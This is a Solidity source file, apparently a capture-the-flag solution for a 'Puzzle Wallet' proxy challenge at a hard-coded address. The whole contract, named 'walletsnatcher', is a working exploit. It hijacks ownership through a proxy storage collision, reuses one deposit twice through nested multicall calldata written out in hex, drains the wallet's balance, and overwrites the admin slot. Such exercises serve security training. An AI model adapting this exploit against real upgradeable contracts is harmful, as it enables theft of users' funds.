// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet {
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract walletsnatcher {
    address public constant INSTANCE_ADDRESS = 0xEebF48d161b9Da35a349696DeC646C43d8912851;
    uint public constant DEPOSIT_AMOUNT = 0.001 ether; //1000000000000000 wei
    IPuzzleProxy IPP = IPuzzleProxy(INSTANCE_ADDRESS);
    IPuzzleWallet IPW = IPuzzleWallet(INSTANCE_ADDRESS);
 
    function snatch() public payable returns (bytes[] memory) {
        IPP.proposeNewAdmin(address(this));
        IPW.addToWhitelist(address(this));

        //do multicall

        bytes memory call2;
	    bytes memory call1;
        bytes[] memory multicall_data = new bytes[](2);

        call1 = hex"d0e30db0";
        call2 = hex"ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000";

        multicall_data[0] = call1;
        multicall_data[1] = call2;
       
        
        //["0xd0e30db0","0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000"]

        IPW.multicall{value:DEPOSIT_AMOUNT}(multicall_data);

        //withdraw all the funds from the contract
        IPW.execute(address(this),(2*DEPOSIT_AMOUNT),hex"");
        IPW.setMaxBalance(uint(tx.origin));
    }

    receive() external payable{
    }

}